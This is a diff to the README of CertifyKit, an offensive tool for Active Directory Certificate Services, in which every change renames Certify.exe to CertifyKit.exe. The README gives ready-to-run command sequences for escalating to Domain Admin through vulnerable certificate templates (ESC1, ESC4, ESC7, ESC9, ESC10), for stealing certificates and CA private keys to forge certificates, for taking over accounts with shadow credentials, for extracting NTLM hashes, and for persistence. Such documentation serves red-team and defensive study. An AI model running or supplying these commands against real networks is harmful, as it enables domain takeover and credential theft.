@@ -20,92 +20,92 @@ More info: https://github.com/Hagrid29/CertifyKit/
 
 Find information about all registered CAs:
 
-    Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
+    CertifyKit.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
 
 
   Find all enabled certificate templates:
 
-    Certify.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+    CertifyKit.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
 
   Find vulnerable/abusable certificate templates using default low-privileged groups:
 
-    Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+    CertifyKit.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
 
   Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
 
-    Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+    CertifyKit.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
 
   Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:
 
-    Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+    CertifyKit.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
 
   Find enabled certificate templates capable of client authentication:
 
-    Certify.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+    CertifyKit.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
 
   Find all enabled certificate templates, display all of their permissions, and don't display the banner message:
 
-    Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
+    CertifyKit.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
 
   Find all enabled certificate templates and output to a json file:
 
-    Certify.exe find /json /log:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
+    CertifyKit.exe find /json /log:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
 
 
   Enumerate access control information for PKI objects:
 
-    Certify.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]
+    CertifyKit.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]
 
 
   Request a new certificate using the current user context:
 
-    Certify.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
+    CertifyKit.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
 
   Request a new certificate using the current machine context:
 
-    Certify.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]
+    CertifyKit.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]
 
   Request a new certificate using the current user context but for an alternate name (if supported):
 
-    Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER
+    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /altname:USER
 
   Request a new certificate on behalf of another user, using an enrollment agent certificate:
 
-    Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
+    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
 
   Alter the template to smart card template and request a new certificate for an alternate name and restore the template to original state:
 
-    Certify.exe request /ca:SERVER\ca-name /template:Y /alter /altname:USER
+    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /alter /altname:USER
 
 
   Download an already requested certificate:
 
-    Certify.exe download /ca:SERVER\ca-name /id:ID [/install] [/machine]
+    CertifyKit.exe download /ca:SERVER\ca-name /id:ID [/install] [/machine]
 
   Issue a pending or deleted certificate:
 
-    Certify.exe download /ca:SERVER\ca-name /issue /id:ID
+    CertifyKit.exe download /ca:SERVER\ca-name /issue /id:ID
 
 
   List all certificates in store My,CurrentUser by default or in a folder recursively:
 
-    Certify.exe list [/storename:X | /sotrelocation:Y | /certificate:C:\Users\] [/password:CERT_PASSWORD] [/recurse]
+    CertifyKit.exe list [/storename:X | /sotrelocation:Y | /certificate:C:\Users\] [/password:CERT_PASSWORD] [/recurse]
 
   Read a certificate specifying thumbprint or file or base64 string with password and export as file or base64 string with a password:
 
-    Certify.exe list /certificate:THUMBPRINT/FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD /encpass:ENC_PASSWORD
+    CertifyKit.exe list /certificate:THUMBPRINT/FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD /encpass:ENC_PASSWORD
 
   Import a certificate from file or base64 string with password to store My,CurrentUser by default
 
-    Certify.exe list /certificate:FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD [/storename:X | /sotrelocation:Y]
+    CertifyKit.exe list /certificate:FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD [/storename:X | /sotrelocation:Y]
 
   Build chain of a certificate from store My,CurrentUser by default specifying thumbprint:
 
-    Certify.exe list /certificate:THUMBPRINT [/storename:X | /sotrelocation:Y] /chain
+    CertifyKit.exe list /certificate:THUMBPRINT [/storename:X | /sotrelocation:Y] /chain
 
   Remove a certificate from store My,CurrentUser by default specifying thumbprint:
 
-    Certify.exe list /certificate:THUMBPRINT /remove [/storename:X | /sotrelocation:Y]
+    CertifyKit.exe list /certificate:THUMBPRINT /remove [/storename:X | /sotrelocation:Y]
 
 
   Backup private key for a Certificate Authority's CA certificate on CA server, which could be used to forge AD CS certificate:
@@ -150,7 +150,7 @@ Find information about all registered CAs:
 Search certificate files in a folder recursively
 
 ```
-Certify.exe list /certificate:C:\Users\ /recurse
+CertifyKit.exe list /certificate:C:\Users\ /recurse
 ```
 
 #### THEFT1 - *Export certificate using Window’s Crypto APIs*
@@ -158,7 +158,7 @@ Certify.exe list /certificate:C:\Users\ /recurse
 List certificates in store for personal certificates assigned to the local machine.
 
 ```
-C:\>.\Certify.exe list /storename:my /storelocation:localmachine
+C:\>.\CertifyKit.exe list /storename:my /storelocation:localmachine
 CertifyKit (Hagrid29 version of Certify)
 More info: https://github.com/Hagrid29/CertifyKit/
 
@@ -177,7 +177,7 @@ More info: https://github.com/Hagrid29/CertifyKit/
 Export certificate specifying thumbprint to file
 
 ```
-C:\>.\Certify.exe list /storename:my /storelocation:localmachine /certificate:64F8A2CCF06C7609918D8DA66B1A29B91722E392 /outfile:cert.pfx
+C:\>.\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:64F8A2CCF06C7609918D8DA66B1A29B91722E392 /outfile:cert.pfx
 CertifyKit (Hagrid29 version of Certify)
 More info: https://github.com/Hagrid29/CertifyKit/
 
@@ -194,7 +194,7 @@ Certify completed in 00:00:00.0944640
 Export CA's certificate with private key on CA server
 
 ```
-Certify.exe list /golden /outfile:gold.p12
+CertifyKit.exe list /golden /outfile:gold.p12
 ```
 
 Forge a certificate with subject alternative name "administrator@corp.local" offline with [ForgeCert](https://github.com/GhostPack/ForgeCert)
@@ -210,7 +210,7 @@ Certify supply option `/machine` to request certificate in machine account conte
 Create machine account
 
 ```
-Certify.exe account /machine:mypc /password:P@ssw0rd123 /create
+CertifyKit.exe account /machine:mypc /password:P@ssw0rd123 /create
 ```
 
 Inject TGT of machine account with [Rubeus](https://github.com/GhostPack/Rubeus)
@@ -222,7 +222,7 @@ Rubeus.exe asktgt /user:mypc /password:P@ssw0rd123 /ptt
 Request a new certificate for vulnerable template/CA, specifying a  `administrator` as the alternate principal, and install the certificate: 
 
 ```
-Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /altname:administrator /install
+CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /altname:administrator /install
 ```
 
 #### ESC4 - *Vulnerable Certificate Template Access Control*
@@ -230,7 +230,7 @@ Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTem
 If we have write privilege and enroll privilege over a certificate template, we could alter the template to smart card template which vulnerable as ESC1
 
 ```
-Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /alter /altname:administrator
+CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /alter /altname:administrator
 ```
 
 
@@ -241,19 +241,19 @@ Assume we are CA manager. We could escalate privilege by issuing pending/deleted
 Enroll a new certificate for a template vulnerable as ESC1 except no enroll right require. Default template `SubCA` fulfil the requirement. Failed enrollment is expected.
 
 ```
-Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:SubCA /altname:administrator
+CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:SubCA /altname:administrator
 ```
 
 Issue the failed certificate request with CA manager privilege (the command work on server 2016+ only)
 
 ```
-Certify.exe download /issue /id:145
+CertifyKit.exe download /issue /id:145
 ```
 
 Download the certificate
 
 ```
-Certify.exe download /id:145
+CertifyKit.exe download /id:145
 ```
 
 #### ESC9 - *CT_FLAG_NO_SECURITY_EXTENSION*
@@ -272,13 +272,13 @@ Example of machine account scenario
 Add "Shadow Credential" to machine account Mypc 
 
 ```
-Certify.exe account /machineLmypc /shadow /outfile:mypc-shadow.pfx
+CertifyKit.exe account /machineLmypc /shadow /outfile:mypc-shadow.pfx
 ```
 
 Change `userPrincipalName` of Mypc to Domain Admin 
 
 ```
-Certify.exe account /machine:mypc /upn:administrator
+CertifyKit.exe account /machine:mypc /upn:administrator
 ```
 
 Authenticate as Mypc and inject TGT
@@ -290,13 +290,13 @@ Rubeus.exe /user:mypc /certificate:mypc-shadow.pfx /ptt
 Enroll a new certificate for the vulnerable template
 
 ```
-Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /install
+CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /install
 ```
 
 Clear `userPrincipalName` of Mypc
 
 ```
-Certify.exe account /user:mypc /upn /clear
+CertifyKit.exe account /user:mypc /upn /clear
 ```
 
 Authenticate as Domain Admin
@@ -331,7 +331,7 @@ Add "Shadow Credential" to account User02
 Change `userPrincipalName` of User02 to DNS hostname of Domain Controller (or Domain Admin account: administrator)
 
 ```
-Certify.exe account /user:user02 /upn:corpdc01$@corp.local
+CertifyKit.exe account /user:user02 /upn:corpdc01$@corp.local
 ```
 
 Authenticate as User02 and inject TGT
@@ -339,7 +339,7 @@ Authenticate as User02 and inject TGT
 Enroll a new certificate for template `user`
 
 ```
-Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:user /install
+CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:user /install
 ```
 
 Restore `userPrincipalName` of User02 to original value
@@ -382,7 +382,7 @@ PassTheCert.exe --server corpadcs.corp.local --cert-path .\esc10-2.pfx --rbcd --
 If we have write privilege over an account, we could take over the account by manipulating its `msDS-KeyCredentialLink` attribute, effectively adding "Shadow Credentials" to the target account.
 
 ```
-Certify.exe account /user:user02 /shadow /outfile:user02-shadow.pfx
+CertifyKit.exe account /user:user02 /shadow /outfile:user02-shadow.pfx
 ```
 
 Authenticate with the "Shadow Credential", and steal NTLM hash
@@ -394,7 +394,7 @@ Rubeus.exe asktgt /user:user02 /certificate:user02-shadow.pfx /getcredentials
 List "Shadow Credential" added to an account
 
 ```
-C:\>.\Certify.exe account /user:user02 /shadow /list
+C:\>.\CertifyKit.exe account /user:user02 /shadow /list
 CertifyKit (Hagrid29 version of Certify)
 More info: https://github.com/Hagrid29/CertifyKit/
 
@@ -409,13 +409,13 @@ More info: https://github.com/Hagrid29/CertifyKit/
 Remove specific "Shadow Credential"
 
 ```
-Certify.exe account /user:user02 /remove:0
+CertifyKit.exe account /user:user02 /remove:0
 ```
 
 Clear all  "Shadow Credential"
 
 ```
-Certify.exe account /user:user02 /shadow /clear
+CertifyKit.exe account /user:user02 /shadow /clear
 ```
 
 #### MISC - *Account persistence with altSecurityIdentities* 
@@ -427,9 +427,9 @@ Assume we obtained Domain Admin privilege. We could perform persistence attack o
 Request a certificate for persistence attack (Alter the template to smart card template and leave the `subjectAltName` blank)
 
 ```
-C:\> .\Certify.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:AnyTemplate /alter /install
+C:\> .\CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:AnyTemplate /alter /install
 
-C:\>.\Certify.exe list
+C:\>.\CertifyKit.exe list
 CertifyKit (Hagrid29 version of Certify)
 More info: https://github.com/Hagrid29/CertifyKit/
 
@@ -449,8 +449,8 @@ More info: https://github.com/Hagrid29/CertifyKit/
 Map the certificate to multiple user
 
 ```
-C:\>.\Certify.exe account /machine:testpc /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
-C:\>.\Certify.exe account /user:user02 /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
+C:\>.\CertifyKit.exe account /machine:testpc /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
+C:\>.\CertifyKit.exe account /user:user02 /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
 ```
 
 Authenticate as multiple users with a single certificate, and steal NTLM hash
